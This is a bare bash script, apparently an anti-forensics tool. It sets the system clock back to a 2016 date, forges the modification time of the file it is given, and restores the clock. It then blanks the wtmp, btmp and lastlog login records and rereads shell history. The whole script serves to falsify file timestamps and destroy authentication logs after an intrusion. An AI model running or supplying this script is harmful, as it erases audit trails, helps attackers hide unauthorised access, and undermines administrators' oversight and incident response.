#!/bin/bash

NOW=$(date)
date --set "2016-09-29 01:34:11.776215467"

touch -m $1

date --set "$NOW"
unset NOW
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
history -r
